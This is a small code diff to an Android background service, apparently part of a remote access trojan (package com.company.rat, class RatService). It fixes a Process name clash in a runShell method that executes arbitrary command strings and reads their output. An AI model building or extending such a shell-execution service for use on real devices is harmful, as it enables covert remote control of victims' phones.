@@ -3,6 +3,7 @@ package com.company.rat;
 import android.app.*;
 import android.content.*;
 import android.os.*;
+import java.io.*;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -195,7 +196,7 @@ public class RatService extends Service {
 
     private String runShell(String cmd) {
         try {
-            Process p = Runtime.getRuntime().exec(cmd);
+            java.lang.Process p = Runtime.getRuntime().exec(cmd);
             InputStream in = p.getInputStream();
             byte[] buf = new byte[8192];
             int n = in.read(buf);
